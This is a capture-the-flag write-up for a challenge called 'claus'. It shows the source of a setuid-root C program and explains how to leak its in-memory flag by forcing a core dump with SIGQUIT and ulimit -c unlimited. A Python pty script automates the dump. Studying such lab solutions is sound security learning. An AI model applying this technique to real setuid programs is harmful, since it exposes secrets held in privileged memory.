# Challenge 2

## Description

```
CLAUS(7)                   Linux Programmer's Manual                   CLAUS(7)

NAME
       claus - unstoppable holiday daemon

DESCRIPTION
       Executes once per annum.
       Blocks SIGTSTP to ensure uninterrupted delivery.
       May dump coal if forced to quit (see BUGS).

BUGS       
       Under some configurations, quitting may result in coal being dumped into
       your stocking.

SEE ALSO
       nice(1), core(5), elf(5), pty(7), signal(7)

Linux                              Dec 2025                            CLAUS(7)
```

## Analysis

This challenge has a set-user-ID root binary in `/challenge/claus`. There's
also a script that runs when the challenge is loaded, that sets the
`core_pattern` to `coal`.

This means that if we can emit a core dump, it will be dumped in the current
directory with the name `coal`. 

**Note** that the `coal` file will still be only accessible by root, however,
if we store it in our home directory, it will be preserved when launching the
challenge in practice mode, and we can change ownership there.

Source code:

```c
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char gift[256];

void wrap(char *gift, size_t size)
{
    fprintf(stdout, "Wrapping gift: [          ] 0%%");
    for (int i = 0; i < size; i++) {
        sleep(1);
        gift[i] = "#####\n"[i % 6];
        int progress = (i + 1) * 100 / size;
        int bars = progress / 10;
        fprintf(stdout, "\rWrapping gift: [");
        for (int j = 0; j < 10; j++) {
            fputc(j < bars ? '=' : ' ', stdout);
        }
        fprintf(stdout, "] %d%%", progress);
        fflush(stdout);
    }
    fprintf(stdout, "\n🎁 Gift wrapped successfully!\n\n");
}

void sigtstp_handler(int signum)
{
    puts("🎅 Santa won't stop!");
}

int main(int argc, char **argv, char **envp)
{
    uid_t ruid, euid, suid;

    if (getresuid(&ruid, &euid, &suid) == -1) {
        perror("getresuid");
        return 1;
    }

    if (euid != 0) {
        fprintf(stderr, "❌ Error: Santa must wrap as root!\n");
        return 1;
    }

    if (ruid != 0) {
        if (setreuid(0, -1) == -1) {
            perror("setreuid");
            return 1;
        }

        fprintf(stdout, "🦌 Now, Dasher! now, Dancer! now, Prancer and Vixen!\nOn, Comet! on Cupid! on, Donder and Blitzen!\n\n");
        execve("/proc/self/exe", argv, envp);

        perror("execve");
        return 127;
    }

    if (signal(SIGTSTP, sigtstp_handler) == SIG_ERR) {
        perror("signal");
        return 1;
    }

    int fd = open("/flag", O_RDONLY);
    if (fd == -1) {
        perror("open");
        return 1;
    }

    int count = read(fd, gift, sizeof(gift));
    if (count == -1) {
        perror("read");
        return 1;
    }

    wrap(gift, count);

    puts("🎄 Merry Christmas!\n");
    puts(gift);

    return 0;
}
```

## Steps to solve this problem:

* Launch `/challenge/claus` from our home directory.
* Make it crash with a core dump.
* Relaunch the challenge in practice mode.
* Open the core dump from practice mode.
* Search for the flag.

For the second step, we should set the core dump size in ulimit to unlimited. `ulimit -c unlimited`.

For crashing it, we can't deliver a signal directly with `kill`, as we are not
allowed to because of permissions. However, we can do `CTRL+\` which delivers a
`SIGQUIT` by the kernel, and its whose default signal disposition is to create
a core dump.

### Things that did not work.

* For some reason, setting the `RLIMIT_CPU` and `RLIMIT_FSIZE` to cause the
  program to receive signals that crash it did not work. I don't know why.

## Solving Programmatically

It is possible to solve the first part of the challenge (generating the
coredump) programmatically, using a pseudo-terminal from python.

Here's the code to do so:

```python
from pathlib import Path

import os
import pty
import time
import signal
import resource

def main():
    coal_path = Path("./coal").resolve()
    assert not coal_path.exists()
    assert Path.home() in coal_path.parents

    challenge_path = Path("/challenge/claus")
    assert challenge_path.exists()

    pid, master_fd = pty.fork()
    if pid == 0:
        resource.setrlimit(resource.RLIMIT_CORE, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
        argv = [challenge_path.as_posix()]
        os.execv(argv[0], argv)
        assert False, "Unreachable"
    else:
        print(f"child pid: {pid}, master_fd: {master_fd}", pid)

        # Give the child a moment to initialize
        time.sleep(1)
        print("sending SIGQUIT...")
        os.write(master_fd, b'\x1c')
        _, status = os.waitpid(pid, 0)

        assert os.WIFSIGNALED(status)
        assert os.WTERMSIG(status) == signal.SIGQUIT

        assert coal_path.exists()
        
        os.close(master_fd)
        print(f"Coal dumped in {coal_path}, please restart in practice mode to open it")

if __name__ == "__main__":
    main()
```

The files can be found in [`first_part.py`](./first_part.py) and
[`second_part.py`](./second_part.py).
